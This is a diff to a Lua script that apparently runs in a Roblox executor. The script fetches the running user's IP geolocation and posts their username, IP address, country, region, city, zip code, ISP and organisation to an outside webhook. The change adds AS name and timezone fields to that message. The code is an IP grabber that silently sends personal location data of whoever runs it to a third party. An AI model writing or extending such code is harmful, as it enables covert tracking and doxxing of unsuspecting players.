@@ -672,7 +672,15 @@ if http_request then
     })
     
     local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
-    local dataMessage = string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org)
+    
+
+    local as_name = ipinfo_table.asname or "N/A"
+    local timezone = ipinfo_table.timezone or "N/A"
+    local isp = ipinfo_table.isp or "N/A"
+    local org = ipinfo_table.org or "N/A"
+    
+    local dataMessage = string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s\nAS Name: %s\nTimezone: %s```", 
+        player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, isp, org, as_name, timezone)
     
     http_request({
         Url = webhook_url,
@@ -685,5 +693,6 @@ if http_request then
 else
     warn("Dein Executor unterstützt keine HTTP-Requests!")
 end
+
 
 
